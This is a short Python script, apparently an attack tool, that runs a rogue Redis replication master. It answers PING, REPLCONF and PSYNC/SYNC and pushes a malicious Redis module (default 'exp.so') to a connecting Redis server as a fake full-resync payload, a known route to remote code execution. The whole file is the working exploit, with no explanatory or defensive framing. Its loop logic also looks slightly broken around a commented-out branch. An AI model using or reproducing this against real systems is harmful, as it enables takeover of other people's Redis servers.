#!/bin/python
# -*- coding:utf-8 -*-
# Author: conanhu
# Date: 4/5/21
# Desc:

import socket
from time import sleep
from optparse import OptionParser

def RogueServer(lport):
    resp = ""
    sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind(("0.0.0.0",lport))
    sock.listen(10)
    conn,address = sock.accept()
    sleep(5)
    while True:
        data = conn.recv(1024)
        if b"PING" in data:
            resp=bytes("+PONG"+CLRF,'utf-8')
            conn.send(resp)
        elif b"REPLCONF" in data:
            resp=bytes("+OK"+CLRF,'utf-8')
            conn.send(resp)
        elif b"PSYNC" in data or b"SYNC" in data:
            resp =  bytes("+FULLRESYNC " + "Z"*40 + " 1" + CLRF+"$"+str(len(payload)) + CLRF,'utf-8')
            # resp = resp.encode()
            resp += payload + CLRF.encode()
            # if type(resp) != bytes:
                # resp =resp.encode()
            conn.send(resp)
        #elif "exit" in data:
            break


if __name__=="__main__":

    parser = OptionParser()
    parser.add_option("--lport", dest="lp", type="int",help="rogue server listen port, default 21000", default=21000,metavar="LOCAL_PORT")
    parser.add_option("-f","--exp", dest="exp", type="string",help="Redis Module to load, default exp.so", default="exp.so",metavar="EXP_FILE")

    (options , args )= parser.parse_args()
    lport = options.lp
    exp_filename = options.exp

    CLRF="\r\n"
    payload=open(exp_filename,"rb").read()
    print(f"Start listing on port: {lport}")
    print(f"Load the payload: {exp_filename}")
    RogueServer(lport)
